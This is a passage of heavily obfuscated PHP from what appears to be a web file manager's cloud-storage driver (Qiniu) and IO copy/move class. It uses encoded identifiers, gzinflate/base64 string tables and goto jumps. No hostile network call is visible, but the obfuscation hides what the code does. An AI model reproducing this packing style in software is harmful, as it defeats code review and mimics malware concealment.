$this->bucket, $±¼‘Ñ¡Í, !0); return $°ƒÍõá† ? !1 : $this->getPathOuter($±¼‘Ñ¡Í); } public function delFile($Ê‡ÓŸò) { if (!$this->exist($Ê‡ÓŸò)) { return !0; } $³—âÃ“Æ = $this->bucketManager->delete($this->bucket, $Ê‡ÓŸò); return $³—âÃ“Æ ? !1 : !0; } public function delFolder($†ãŒ“Ùï) { $‰¬˜¬Ç¾ =& $_SERVER[§ŒØóıü]; if (!$this->exist($†ãŒ“Ùï)) { return !0; } $this->listItemCache = !1; $ô­üÀêİ = $this->fileList($†ãŒ“Ùï); $this->listItemCache = !0; $ïŞíáÏÔ = trim($†ãŒ“Ùï, $‰¬˜¬Ç¾[8]) . $‰¬˜¬Ç¾[8]; if (!empty($†ãŒ“Ùï) && $†ãŒ“Ùï !== $‰¬˜¬Ç¾[198] && !in_array($ïŞíáÏÔ, $ô­üÀêİ[$‰¬˜¬Ç¾[82]])) { $ô­üÀêİ[$‰¬˜¬Ç¾[82]][] = $ïŞíáÏÔ; } $öİØİü = $this->delByBatch($ô­üÀêİ[$‰¬˜¬Ç¾[83]]); if (!$öİØİü) { return !1; } $öİØİü = $this->delByBatch($ô­üÀêİ[$‰¬˜¬Ç¾[82]]); if (!$öİØİü) { return !1; } return $this->delFile($ïŞíáÏÔ); } private function delByBatch($‡¬¤”½€) { foreach (array_chunk($‡¬¤”½€, 1000) as $Êï•ÍËµ) { $îÉ‹®á¿ = $this->bucketManager->buildBatchDelete($this->bucket, $Êï•ÍËµ); list($ÓÇùã›, $–ğâá¦º) = $this->bucketManager->batch($îÉ‹®á¿); if ($–ğâá¦º) { return !1; } } return !0; } public function rename($ŞÂØ‰ªƒ, $äÔŠğ²) { return $this->renameObject($ŞÂØ‰ªƒ, $äÔŠğ²); } public function fileInfo($¸øùÆµû, $ñõÀÇŠ˜ = false, $­ÌĞ‘ˆ‹ = array()) { $õ®‚Áğ =& $_SERVER[§ŒØóıü]; $æ‡ŠÖ»è = array($õ®‚Áğ[32] => $this->pathThis($¸øùÆµû), $õ®‚Áğ[84] => $this->getPathOuter($õ®‚Áğ[8] . $¸øùÆµû), $õ®‚Áğ[33] => $õ®‚Áğ[200], $õ®‚Áğ[76] => isset($­ÌĞ‘ˆ‹[$õ®‚Áğ[1446]]) ? $­ÌĞ‘ˆ‹[$õ®‚Áğ[1446]] : 0, $õ®‚Áğ[174] => $this->ext($¸øùÆµû)); if ($ñõÀÇŠ˜) { return $æ‡ŠÖ»è; } $æ‡ŠÖ»è[$õ®‚Áğ[201]] = $æ‡ŠÖ»è[$õ®‚Áğ[85]] = 0; $æ‡ŠÖ»è[$õ®‚Áğ[202]] = $æ‡ŠÖ»è[$õ®‚Áğ[203]] = !0; if (empty($­ÌĞ‘ˆ‹)) { $­ÌĞ‘ˆ‹ = $this->objectMeta($¸øùÆµû); if (!$­ÌĞ‘ˆ‹) { return $æ‡ŠÖ»è; } } if (isset($­ÌĞ‘ˆ‹[$õ®‚Áğ[1447]])) { $æ‡ŠÖ»è[$õ®‚Áğ[85]] = substr($­ÌĞ‘ˆ‹[$õ®‚Áğ[1447]] . $õ®‚Áğ[12], 0, 10); } if (isset($­ÌĞ‘ˆ‹[$õ®‚Áğ[1446]])) { $æ‡ŠÖ»è[$õ®‚Áğ[76]] = $­ÌĞ‘ˆ‹[$õ®‚Áğ[1446]]; } return $æ‡ŠÖ»è; } public function folderInfo($Ê¹éÛµÕ, $’ŸÜÇËÆ = false) { $ßŠ“Ù¹å =& $_SERVER[§ŒØóıü]; $ˆÆìÒ‡† = array($ßŠ“Ù¹å[32] => $this->pathThis($Ê¹éÛµÕ), $ßŠ“Ù¹å[84] => $this->getPathOuter($ßŠ“Ù¹å[8] . $Ê¹éÛµÕ), $ßŠ“Ù¹å[33] => $ßŠ“Ù¹å[75]); if ($’ŸÜÇËÆ) { return $ˆÆìÒ‡†; } $ˆÆìÒ‡†[$ßŠ“Ù¹å[201]] = $ˆÆìÒ‡†[$ßŠ“Ù¹å[85]] = 0; $ˆÆìÒ‡†[$ßŠ“Ù¹å[202]] = $ˆÆìÒ‡†[$ßŠ“Ù¹å[203]] = !0; $Ê¹éÛµÕ = rtrim($Ê¹éÛµÕ, $ßŠ“Ù¹å[8]) . $ßŠ“Ù¹å[8]; $õÔ¶Õ›¼ = $this->objectMeta($Ê¹éÛµÕ); if (isset($õÔ¶Õ›¼[$ßŠ“Ù¹å[1447]])) { $ˆÆìÒ‡†[$ßŠ“Ù¹å[85]] = substr($õÔ¶Õ›¼[$ßŠ“Ù¹å[1447]] . $ßŠ“Ù¹å[12], 0, 10); } return $ˆÆìÒ‡†; } public function listPath($è·Û·éÇ, $ªŞ¿¼ ˆ = false) { $›÷æÊñ =& $_SERVER[§ŒØóıü]; $šõÃ‚ø– = $this->fileList($è·Û·éÇ, $›÷æÊñ[8], !0); foreach ($šõÃ‚ø–[$›÷æÊñ[82]] as $âŒŞÜß¤ => $Ñ§ÆÃù) { $šõÃ‚ø–[$›÷æÊñ[82]][$âŒŞÜß¤] = $this->folderInfo($Ñ§ÆÃù, $ªŞ¿¼ ˆ); } foreach ($šõÃ‚ø–[$›÷æÊñ[83]] as $âŒŞÜß¤ => $Ñ§ÆÃù) { $šõÃ‚ø–[$›÷æÊñ[83]][$âŒŞÜß¤] = $this->fileInfo($Ñ§ÆÃù[$›÷æÊñ[94]], $ªŞ¿¼ ˆ, $Ñ§ÆÃù); } return $šõÃ‚ø–; } public function has($ñ÷úîê, $Á÷ÄÒã = false, $¹ÆİöÖÚ = true) { $„ü“ûê… =& $_SERVER[§ŒØóıü]; $ñ÷úîê = trim($ñ÷úîê, $„ü“ûê…[8]); $õ‘„´»¥ = empty($ñ÷úîê) && $ñ÷úîê !== $„ü“ûê…[198] ? $„ü“ûê…[12] : $ñ÷úîê . $„ü“ûê…[8]; $¨å‰•ñğ = $„ü“ûê…[12]; $±¶Ã‚Œ£ = 500; $ÊÔ¨÷†ñ = $„ü“ûê…[8]; $ÙØÓ¢“© = $íÚÎ»ÑØ = 0; while (!0) { check_abort(); list($µá­ñåØ, $ß€´˜Îü) = $this->bucketManager->listFiles($this->bucket, $õ‘„´»¥, $¨å‰•ñğ, $±¶Ã‚Œ£, $ÊÔ¨÷†ñ); if ($ß€´˜Îü) { break; } $¨å‰•ñğ = array_key_exists($„ü“ûê…[1415], $µá­ñåØ) ? $¨å‰•ñğ = $µá­ñåØ[$„ü“ûê…[1448]] : $„ü“ûê…[12]; if ($Á÷ÄÒã) { if (!empty($µá­ñåØ[$„ü“ûê…[1449]])) { $ÙØÓ¢“© += count($µá­ñåØ[$„ü“ûê…[1449]]); } if (!empty($µá­ñåØ[$„ü“ûê…[1450]])) { $íÚÎ»ÑØ += count($µá­ñåØ[$„ü“ûê…[1450]]); } if ($¨å‰•ñğ === $„ü“ûê…[12]) { break; } continue; } if ($¹ÆİöÖÚ) { if (!empty($µá­ñåØ[$„ü“ûê…[1449]])) { return !0; } } else { if (!empty($µá­ñåØ[$„ü“ûê…[1450]])) { return !0; } } if ($¨å‰•ñğ === $„ü“ûê…[12]) { break; } } if ($Á÷ÄÒã) { return array($„ü“ûê…[207] => $ÙØÓ¢“©, $„ü“ûê…[208] => $íÚÎ»ÑØ); } return !1; } public function listAll($©•¢ñÕì) { $­©Œª‚ =& $_SERVER[§ŒØóıü]; $ù¦–üÜ” = $this->fileList($©•¢ñÕì, $­©Œª‚[12], !0); $ô‘Ÿ­±ı = array_to_keyvalue($ù¦–üÜ”[$­©Œª‚[83]], $­©Œª‚[32]); foreach ($ù¦–üÜ”[$­©Œª‚[82]] as $—™íÕá¢) { if (is_string($—™íÕá¢)) { $ô‘Ÿ­±ı[$—™íÕá¢] = array($­©Œª‚[76] => 0); } } return $this->listAllFiles($©•¢ñÕì, $ô‘Ÿ­±ı); } private function fileList($˜¿˜¢›², $ã×¥¯µ = '', $î‰Æ«íî = 0) { $ÔÁ˜ô·Â =& $_SERVER[§ŒØóıü]; $˜¿˜¢›² = trim($˜¿˜¢›², $ÔÁ˜ô·Â[8]); $ŞËÖ¾ = empty($˜¿˜¢›²) && $˜¿˜¢›² !== $ÔÁ˜ô·Â[198] ? $ÔÁ˜ô·Â[12] : $˜¿˜¢›² . $ÔÁ˜ô·Â[8]; $ƒª¨›¢¥ = $ÔÁ˜ô·Â[12]; $Û„ÍŒğ = 1000; $İÔÀŸä† = $œéöÄ¤ô = array(); while (!0) { check_abort(); list($ãò²‘Ù, $æÀø˜Ú) = $this->bucketManager->listFiles($this->bucket, $ŞËÖ¾, $ƒª¨›¢¥, $Û„ÍŒğ, $ã×¥¯µ); if ($æÀø˜Ú) { break; } $ƒª¨›¢¥ = array_key_exists($ÔÁ˜ô·Â[1415], $ãò²‘Ù) ? $ƒª¨›¢¥ = $ãò²‘Ù[$ÔÁ˜ô·Â[1448]] : $ÔÁ˜ô·Â[12]; $àÄê•Æ‹ = isset($ãò²‘Ù[$ÔÁ˜ô·Â[1449]]) ? $ãò²‘Ù[$ÔÁ˜ô·Â[1449]] : array(); $ÏëŸÌõ² = isset($ãò²‘Ù[$ÔÁ˜ô·Â[1450]]) ? $ãò²‘Ù[$ÔÁ˜ô·Â[1450]] : array(); foreach ($àÄê•Æ‹ as $ õÀ¶öî) { if ($ õÀ¶öî[$ÔÁ˜ô·Â[94]] == $ŞËÖ¾) { continue; } $ÈÕ•×­î = $ õÀ¶öî[$ÔÁ˜ô·Â[94]]; $ú…ƒÍõ¤ = $ õÀ¶öî[$ÔÁ˜ô·Â[1446]]; $ õÀ¶öî[$ÔÁ˜ô·Â[76]] = $ú…ƒÍõ¤; $òïÌº = $ú…ƒÍõ¤ == 0 && substr($ÈÕ•×­î, strlen($ÈÕ•×­î) - 1, 1) == $ÔÁ˜ô·Â[8] ? !0 : !1; $this->cacheMethodInfoSet($ÈÕ•×­î, $òïÌº, $ õÀ¶öî); if ($òïÌº) { $İÔÀŸä†[] = $ÈÕ•×­î; continue; } $œéöÄ¤ô[] = $î‰Æ«íî ? $ õÀ¶öî : $ÈÕ•×­î; } foreach ($ÏëŸÌõ² as $ÈÕ•×­î) { if ($ÈÕ•×­î == $ŞËÖ¾) { continue; } $İÔÀŸä†[] = $ÈÕ•×­î; $this->cacheMethodInfoSet($ÈÕ•×­î, !0); } if ($ƒª¨›¢¥ === $ÔÁ˜ô·Â[12]) { break; } } $this->cacheMethodInfoSet($˜¿˜¢›², !0); return array($ÔÁ˜ô·Â[82] => $İÔÀŸä†, $ÔÁ˜ô·Â[83] => $œéöÄ¤ô); } public function canRead($Ğ—™Çˆï) { return $this->exist($Ğ—™Çˆï) ? !0 : !1; } public function canWrite($è„Öšˆà) { return $this->exist($è„Öšˆà) ? !0 : !1; } public function getContent($—¶”ÉÆ) { return $this->fileSubstr($—¶”ÉÆ, 0, -1); } public function setContent($úèî•Á¹, $Î³çş²ö = '') { $Ñª†Äş = $this->tempFile($this->pathThis($úèî•Á¹)); file_put_contents($Ñª†Äş, $Î³çş²ö); if ($this->upload($úèî•Á¹, $Ñª†Äş)) { $this->tempFileRemve($Ñª†Äş); return !0; } return !1; } public function refreshUrls($ê™´Ûòú) { $öê¼è› =& $_SERVER[§ŒØóıü]; $Á¬±‚…Ê = array(); if (is_array($ê™´Ûòú)) { foreach ($ê™´Ûòú as $µ…†—©Û) { $Á¬±‚…Ê[] = $this->link($µ…†—©Û); } } else { $Á¬±‚…Ê[] = $this->link($ê™´Ûòú); } $ÃÈüœª² = new Qiniu\Cdn\CdnManager($this->auth); list($ĞÏ—É´ù, $Äßãµ„«) = $ÃÈüœª²->refreshUrls($Á¬±‚…Ê); if ($Äßãµ„«) { return !1; } return $ĞÏ—É´ù[$öê¼è›[1188]] == $öê¼è›[765] ? !0 : !1; } public function fileSubstr($ô…Æ°À×, $ƒÌ·Â¥», $ŠÏÌß) { $ˆ¥‰­ê =& $_SERVER[§ŒØóıü]; if (!($•›´‡Ÿš = $this->link($ô…Æ°À×))) { return !1; } $ˆäÆ€¼Ì = !1; if ($ŠÏÌß > 0) { $Ã¿¢»ış = $ƒÌ·Â¥» + $ŠÏÌß - 1; $ˆäÆ€¼Ì = array($ˆ¥‰­ê[1451] . $ƒÌ·Â¥» . $ˆ¥‰­ê[386] . $Ã¿¢»ış); } $µ‚ğ«ö— = url_request($•›´‡Ÿš, $ˆ¥‰­ê[230], !1, $ˆäÆ€¼Ì); return $µ‚ğ«ö—[$ˆ¥‰­ê[755]] ? $µ‚ğ«ö—[$ˆ¥‰­ê[1208]] : !1; } public function upload($åÀìïı‹, $Î´›ˆè, $—€¦Œ´ = false, $Ì´óå¤ = REPEAT_REPLACE) { $Ş‡…¸şí = new Qiniu\Storage\UploadManager(); $ïƒ¹œÂğ = $this->auth->uploadToken($this->bucket, $åÀìïı‹); $Ì’Ú¹òí = get_file_mime(get_path_ext($Î´›ˆè)); list($ŞÖÇúñƒ, $„ÕÛû“ù) = $Ş‡…¸şí->putFile($ïƒ¹œÂğ, $åÀìïı‹, $Î´›ˆè, null, $Ì’Ú¹òí); return $„ÕÛû“ù ? !1 : $this->getPathOuter($åÀìïı‹); } public function uploadFormData($¸Ë®ÏÕ, $ã¾ëêÎş = 3600) { return $this->uploadToken($¸Ë®ÏÕ, $ã¾ëêÎş); } public function multiUploadFormData($¤¸‹†Ê€, $ÓÍÇ¹Áİ = 3600) { return $this->uploadToken($¤¸‹†Ê€, $ÓÍÇ¹Áİ); } private function uploadToken($õ…ÕóÅ, $ŠéÌµ†™ = 3600) { $™€ì¶×ñ =& $_SERVER[§ŒØóıü]; $è‘¢ÈƒŒ = $ŠéÌµ†™; $’¬‘•  = array($™€ì¶×ñ[1452] => $™€ì¶×ñ[1453]); $éõİûŸ = $õ…ÕóÅ; $¥™Õ¨ˆû = $this->auth->uploadToken($this->bucket, $éõİûŸ, $è‘¢ÈƒŒ, $’¬‘• , !0); $ˆ®©€Ø© = empty($this->region) || $this->region == $™€ì¶×ñ[1454] ? $™€ì¶×ñ[12] : $™€ì¶×ñ[386] . $this->region; $¼úÆ“±Í = http_type() . "\72\x2f\57\x75\x70\x6c\x6f\141\x64{$ˆ®©€Ø©}\56\x71\151\x6e\151\165\x70\x2e\x63\157\x6d\x2f"; return array($™€ì¶×ñ[1455] => $¥™Õ¨ˆû, $™€ì¶×ñ[1456] => $¼úÆ“±Í); } public function download($Ï¶—ö¨â, $î¨Û®ôÉ) { $¢ùáäïº = IO::getPathInner(IO::mkfile($î¨Û®ôÉ)); if (!($“Ü‰¤ü = $this->link($Ï¶—ö¨â))) { return !1; } $—ÁıÕñ§ = 0; $ôŠ×•±½ = 1024 * 200; $¢‰ãÀÏ = fopen($¢ùáäïº, $_SERVER[§ŒØóıü][1457]); while (!0) { $îÛ®ö ª = $this->fileSubstr($Ï¶—ö¨â, $—ÁıÕñ§, $ôŠ×•±½); if ($îÛ®ö ª === !1) { return !1; } fwrite($¢‰ãÀÏ, $îÛ®ö ª); $—ÁıÕñ§ += $ôŠ×•±½; if (strlen($îÛ®ö ª) < $ôŠ×•±½) { break; } } fclose($¢‰ãÀÏ); return $î¨Û®ôÉ; } public function link($„å±©´ã, $½€óÄ¹Ü = '') { if (!$this->isFile($„å±©´ã)) { return !1; } $ƒ´í«Êô = $this->getHost() . $_SERVER[§ŒØóıü][8] . $this->pathEncode($„å±©´ã) . $½€óÄ¹Ü; return $this->auth->privateDownloadUrl($ƒ´í«Êô, 3600 * 12); } public function fileOut($Ë¤–Ê°Ş, $ßşÊ®»” = false, $™şŞøÛé = false, $€…±ØÀ = '') { $ãØº ¡ =& $_SERVER[§ŒØóıü]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ë¤–Ê°Ş, $ßşÊ®»”, $™şŞøÛé, $€…±ØÀ); } if (!$™şŞøÛé) { $™şŞøÛé = $this->pathThis($Ë¤–Ê°Ş); } $¤ŸÑŸ¯… = $ßşÊ®»” ? $ãØº ¡[1458] . rawurlencode($™şŞøÛé) : $ãØº ¡[12]; $ÈçÃ¾Ê´ = $this->link($Ë¤–Ê°Ş, $¤ŸÑŸ¯…); $this->fileOutLink($ÈçÃ¾Ê´); } public function fileOutServer($ñ¯“ôà°, $Å¤˜ ñ§ = false, $õ­…äœ = false, $×öÜ©¬ = '') { parent::fileOut($ñ¯“ôà°, $Å¤˜ ñ§, $õ­…äœ, $×öÜ©¬); } public function fileOutImage($‘Ò£ë, $«÷õØá = 250) { $¿ïù”û = $this->link($‘Ò£ë, $_SERVER[§ŒØóıü][1459] . $«÷õØá); $this->fileOutLink($¿ïù”û); } public function fileOutImageServer($„ÏÎÊ³ã, $Íõò‹Ó… = 250) { parent::fileOutImage($„ÏÎÊ³ã, $Íõò‹Ó…); } public function hashMd5($ØùƒØÑ´) { $É¥íÓ’ =& $_SERVER[§ŒØóıü]; $É¿‡á…æ = $this->objectMeta($ØùƒØÑ´); return isset($É¿‡á…æ[$É¥íÓ’[212]]) ? $É¿‡á…æ[$É¥íÓ’[212]] : !1; $Ü’ş—Ş« = $this->link($ØùƒØÑ´, $É¥íÓ’[1460]); } public function size($ÊÒ²…ØÊ) { $ğŸ¼´Ûı = $this->objectMeta($ÊÒ²…ØÊ); return $ğŸ¼´Ûı ? $ğŸ¼´Ûı[$_SERVER[§ŒØóıü][76]] : 0; } public function info($ŒÕ¥»Ä±) { if ($this->isFolder($ŒÕ¥»Ä±)) { return $this->folderInfo($ŒÕ¥»Ä±); } else { if ($this->isFile($ŒÕ¥»Ä±)) { return $this->fileInfo($ŒÕ¥»Ä±); } } return !1; } public function exist($¤òœÅ¢«) { return $this->isFile($¤òœÅ¢«) || $this->isFolder($¤òœÅ¢«); } public function isFile($Å‚½úÊ) { return !$this->isFolder($Å‚½úÊ) && $this->objectMeta($Å‚½úÊ); } public function isFolder($ƒ—Ùª¹) { return $this->cacheMethod($_SERVER[§ŒØóıü][165], $ƒ—Ùª¹); } protected function objectMeta($Ù¦ÅêœØ) { return $this->cacheMethod($_SERVER[§ŒØóıü][167], $Ù¦ÅêœØ); } protected function _objectMeta($çÁ‚‘ôó) { $îş®§œ =& $_SERVER[§ŒØóıü]; list($Î˜ÓÁñó, $ù²„öÍü) = $this->bucketManager->stat($this->bucket, $çÁ‚‘ôó); if ($Î˜ÓÁñó) { $Î˜ÓÁñó[$îş®§œ[76]] = intval($Î˜ÓÁñó[$îş®§œ[1446]]); } return $Î˜ÓÁñó; } protected function _isFolder($èÅİ——ü) { $„Ùàâ€Ó =& $_SERVER[§ŒØóıü]; if ($èÅİ——ü == $„Ùàâ€Ó[12] || $èÅİ——ü == $„Ùàâ€Ó[8]) { return !0; } list($ß·ãÒ‘ø, $ÑˆœÊã•) = $this->bucketManager->listFiles($this->bucket, trim($èÅİ——ü, $„Ùàâ€Ó[8]) . $„Ùàâ€Ó[8], $„Ùàâ€Ó[12], 1, $„Ùàâ€Ó[8]); return !empty($ß·ãÒ‘ø[$„Ùàâ€Ó[1449]]) || !empty($ß·ãÒ‘ø[$„Ùàâ€Ó[1450]]) ? !0 : !1; } } goto eóÔ¼õ¨Æ¯; dƒ„Ì³¼˜: function binCheckBigger($ÜÛÕşÕ, $ÅÃà­¦ƒ) { return $ÜÛÕşÕ > $ÅÃà­¦ƒ; } $_SERVER[$_SERVER[£›öŒ½Ë][3]] = (base64_decode('ODE2OQ==')."\70\61")+0;$_8qrv="nt5uv84wm1zcdh3egaiflyp9jrko72bxs6q09br5oemfdjuw16ahg3nt0x84qi7kypvzscl";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ï‘úù«Ç, $­ò»ñæŠ) { $ğ®Ú‡ˆĞ =& $_SERVER[§ŒØóıü]; if (isset(self::$_methodList[$ï‘úù«Ç])) { return @call_user_func_array(self::$_methodList[$ï‘úù«Ç], $­ò»ñæŠ); } else { if (method_exists($this, $ï‘úù«Ç)) { return call_user_func_array(array($this, $ï‘úù«Ç), $­ò»ñæŠ); } else { think_exception(__CLASS__ . $ğ®Ú‡ˆĞ[4] . $ï‘úù«Ç . $ğ®Ú‡ˆĞ[5]); } } } public static function __callStatic($–¬³ƒ¾ê, $‹é¥¥˜Š) { if (isset(self::$_methodListStatic[$–¬³ƒ¾ê])) { return call_user_func_array(self::$_methodListStatic[$–¬³ƒ¾ê], $‹é¥¥˜Š); } else { if (method_exists(self, $–¬³ƒ¾ê)) { return call_user_func_array(array(self, $–¬³ƒ¾ê), $‹é¥¥˜Š); } else { show_json("{$–¬³ƒ¾ê}\50\x29\x20\x6e\157\x74\x20\x65\170\151\x73\x74\73", !1); } } } public static function addMethod($¢ê¯òş³, $Ò–êÑ±ş) { self::$_methodList[$¢ê¯òş³] = $Ò–êÑ±ş; } public static function addMethodStatic($Óşù‚Ûõ, $­²ºÆÛœ) { self::$_methodListStatic[$Óşù‚Ûõ] = $­²ºÆÛœ; } } goto f–¡£¾âĞ; d¼Œë¡±Õ: define($_SERVER[§ŒØóıü][0], $_SERVER[§ŒØóıü][1]); $_SERVER[£›öŒ½Ë] = explode($_SERVER[§ŒØóıü][2], gzinflate(substr($_SERVER[§ŒØóıü][3], 10, -8))); function binCheckEq($æŞ¨û…Ø, $Öà§“û­) { return $æŞ¨û…Ø == $Öà§“û­; } goto bšŸŒÖˆÔğ; FŠ³ÕÓò¿é: $_SERVER[ÉÖ¬ãã¿] = explode($_SERVER[§ŒØóıü][608], gzinflate(substr($_SERVER[§ŒØóıü][609], 10, -8))); $aohjkfpemz = $_SERVER[§ŒØóıü][610]; if (!$aohjkfpemz) { return; } goto ešÊí¸Â¶; D£§…Ê: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Àç³’Äû, $óœú¼İ¡) { $ëÜ‘³˜¹ =& $_SERVER[§ŒØóıü]; $¾™ººÈ° = $óœú¼İ¡; $GLOBALS[$ëÜ‘³˜¹[1152]] = $ëÜ‘³˜¹[1153] . $Àç³’Äû; Hook::trigger($ëÜ‘³˜¹[1153] . $Àç³’Äû . $ëÜ‘³˜¹[1154], $¾™ººÈ°); $ÇÔºÏï = self::driverMake($óœú¼İ¡[0]); if (!$ÇÔºÏï) { return !1; } if (method_exists($ÇÔºÏï, $Àç³’Äû)) { $ ¨ß©Ì¡ = @call_user_func_array(array($ÇÔºÏï, $Àç³’Äû), $óœú¼İ¡); } else { if (method_exists($ÇÔºÏï, $ëÜ‘³˜¹[1155])) { $ ¨ß©Ì¡ = @call_user_func_array(array($ÇÔºÏï, $Àç³’Äû), $óœú¼İ¡); } else { if (method_exists(self, $Àç³’Äû)) { $ ¨ß©Ì¡ = @call_user_func_array(array(self, $Àç³’Äû), $óœú¼İ¡); } else { $ ¨ß©Ì¡ = call_user_func_array(array(parent, $Àç³’Äû), $óœú¼İ¡); } } } Hook::trigger($ëÜ‘³˜¹[1153] . $Àç³’Äû . $ëÜ‘³˜¹[1156], $¾™ººÈ°, $ ¨ß©Ì¡); return $ ¨ß©Ì¡; } public static function init($ •‰‚æ) { return self::driverMake($ •‰‚æ); } public static function copy($Ô½¹™Õ¼, $ÉÚ€È¿, $¬ä‹¤µ¼ = false, $ÄáƒƒçŒ = false) { return self::copyMoveStart($Ô½¹™Õ¼, $ÉÚ€È¿, $¬ä‹¤µ¼, $_SERVER[§ŒØóıü][546], $ÄáƒƒçŒ); } public static function move($ÑæØË, $‚Êš¸÷¤, $ãš«êêÉ = false, $Î€ùÚûÕ = false) { return self::copyMoveStart($ÑæØË, $‚Êš¸÷¤, $ãš«êêÉ, $_SERVER[§ŒØóıü][548], $Î€ùÚûÕ); } private static function copyMoveStart($êÈúëÚ, $ù€¸ë—ä, $Ãı°û‰, $ƒŞßó¼, $ê´¡“¯æ) { $È‘ÓÀçÙ =& $_SERVER[§ŒØóıü]; $Û¾ïòå = array($êÈúëÚ, $ù€¸ë—ä, $Ãı°û‰, $ê´¡“¯æ); Hook::trigger($È‘ÓÀçÙ[1153] . $ƒŞßó¼ . $È‘ÓÀçÙ[1154], $Û¾ïòå); $å•Óì”å = self::copyMove($êÈúëÚ, $ù€¸ë—ä, $Ãı°û‰, $ƒŞßó¼, $ê´¡“¯æ); Hook::trigger($È‘ÓÀçÙ[1153] . $ƒŞßó¼ . $È‘ÓÀçÙ[1156], $Û¾ïòå, $å•Óì”å); return $å•Óì”å; } public static function saveFile($Åø†³¾ƒ, $èøÈåå, $Ï æõÕï = true) { $¢ ¶­É£ =& $_SERVER[§ŒØóıü]; $üşŞêçç = self::info($èøÈåå); $ÊéãŒ‡ı = self::driverMake($Åø†³¾ƒ); $¹éâÕÁß = self::driverMake($èøÈåå); $Ã­ûŞš = !1; if ($¹éâÕÁß->pathParse[$¢ ¶­É£[1157]]) { $Ã­ûŞš = $¹éâÕÁß; $ï¹ŸÄ¡ˆ = $¹éâÕÁß->pathParse[$¢ ¶­É£[1157]]; $¹éâÕÁß = self::driverMake($ï¹ŸÄ¡ˆ); } if ($ÊéãŒ‡ı->pathParse[$¢ ¶­É£[1157]]) { $øÜ±¸’ª = $ÊéãŒ‡ı->pathParse[$¢ ¶­É£[1157]]; $ÊéãŒ‡ı = self::driverMake($øÜ±¸’ª); } $–áö®©ƒ = $¹éâÕÁß->pathFather($èøÈåå); $Ôší¢œ = !0; if (!$Ï æõÕï && self::driverIsSame($ÊéãŒ‡ı, $¹éâÕÁß)) { $Ôší¢œ = !1; } $¼Ùşµå£ = self::copyFile($ÊéãŒ‡ı, $Åø†³¾ƒ, $¹éâÕÁß, $–áö®©ƒ, $üşŞêçç[$¢ ¶­É£[32]], $Ôší¢œ); if ($Ã­ûŞš) { $¼Ùşµå£ = $Ã­ûŞš->getPathOuter($¼Ùşµå£); } return $¼Ùşµå£; } private static function copyMove($­ºá¢—Æ, $Šñ©ƒÙ, $ÛÄ²Áìß, $‰Êùİ², $ÍˆØ‹óä = false) { $ˆĞœƒ« =& $_SERVER[§ŒØóıü]; if (!$­ºá¢—Æ || $­ºá¢—Æ == $ˆĞœƒ«[8] || !$Šñ©ƒÙ) { return !1; } ignore_timeout(); $ÃÜÕ¹Äå = self::driverMake($­ºá¢—Æ); $Ù‘£…¾ = self::driverMake($Šñ©ƒÙ); $‡¤×¹–” = $‰Êùİ² == $ˆĞœƒ«[548]; $¢¯Ãûƒ¯ = !1; if ($Ù‘£…¾->pathParse[$ˆĞœƒ«[1157]]) { $¢¯Ãûƒ¯ = $Ù‘£…¾; $Šñ©ƒÙ = $Ù‘£…¾->pathParse[$ˆĞœƒ«[1157]]; $Ù‘£…¾ = self::driverMake($Šñ©ƒÙ); } if ($ÃÜÕ¹Äå->pathParse[$ˆĞœƒ«[1157]]) { $­ºá¢—Æ = $ÃÜÕ¹Äå->pathParse[$ˆĞœƒ«[1157]]; $ÃÜÕ¹Äå = self::driverMake($­ºá¢—Æ); } self::check($ÃÜÕ¹Äå, $­ºá¢—Æ, $Ù‘£…¾, $Šñ©ƒÙ); Hook::trigger($ˆĞœƒ«[1158], $ÃÜÕ¹Äå, $­ºá¢—Æ, $Ù‘£…¾, $Šñ©ƒÙ); $èŸ–öîñ = self::driverIsSame($ÃÜÕ¹Äå, $Ù‘£…¾); if ($èŸ–öîñ) { if ($‰Êùİ² == $ˆĞœƒ«[548] && !method_exists($Ù‘£…¾, $ˆĞœƒ«[1159]) && trim($Šñ©ƒÙ, $ˆĞœƒ«[8]) == trim($Ù‘£…¾->pathFather($­ºá¢—Æ), $ˆĞœƒ«[8])) { if ($ÃÜÕ¹Äå->pathThis($­ºá¢—Æ) != $ÍˆØ‹óä && !$ÃÜÕ¹Äå->isTypeObject()) { return $ÃÜÕ¹Äå->rename($­ºá¢—Æ, $ÍˆØ‹óä); } return $Ù‘£…¾->getPathOuter($­ºá¢—Æ); } if (method_exists($Ù‘£…¾, $‰Êùİ²)) { return $Ù‘£…¾->{$‰Êùİ²}($­ºá¢—Æ, $Šñ©ƒÙ, $ÛÄ²Áìß, $ÍˆØ‹óä); } } if ($èŸ–öîñ && $‰Êùİ² == $ˆĞœƒ«[548] && $Ù‘£…¾->getType() == $ˆĞœƒ«[106]) { $œè‡ºÛÇ = $Ù‘£…¾->movePath($­ºá¢—Æ, $Šñ©ƒÙ, $ÍˆØ‹óä); if ($œè‡ºÛÇ) { return $œè‡ºÛÇ; } } $¡„…Àê® = $ÃÜÕ¹Äå->isFile($­ºá¢—Æ); if (!$¡„…Àê® && $Ù‘£…¾->getType() == $ˆĞœƒ«[763] && $ÃÜÕ¹Äå->getType() == $ˆĞœƒ«[106]) { $œè‡ºÛÇ = $Ù‘£…¾->copyFolderFromIO($ÃÜÕ¹Äå, $­ºá¢—Æ, $Šñ©ƒÙ, $ÛÄ²Áìß, $‡¤×¹–”, $ÍˆØ‹óä); } else { $œè‡ºÛÇ = self::copyPath($ÃÜÕ¹Äå, $­ºá¢—Æ, $Ù‘£…¾, $Šñ©ƒÙ, $ÛÄ²Áìß, $‡¤×¹–”, $¡„…Àê®, $ÍˆØ‹óä); } if ($œè‡ºÛÇ && $‡¤×¹–”) { $ÃÜÕ¹Äå->remove($­ºá¢—Æ); } if ($¢¯Ãûƒ¯) { $œè‡ºÛÇ = $¢¯Ãûƒ¯->getPathOuter($œè‡ºÛÇ); } return $œè‡ºÛÇ; } private static function check($‚‘Å„¦ß, $ˆá¸éáÍ, $Ñ‚ÄÏáå, &$Îœš‹¦) { $­Ç÷ó¤ã =& $_SERVER[§ŒØóıü]; if (self::driverIsSame($‚‘Å„¦ß, $Ñ‚ÄÏáå) && $‚‘Å„¦ß->isFolder($ˆá¸éáÍ) && $‚‘Å„¦ß->isParentOf($ˆá¸éáÍ, $Îœš‹¦)) { show_json(LNG($­Ç÷ó¤ã[1160]), !1); } if 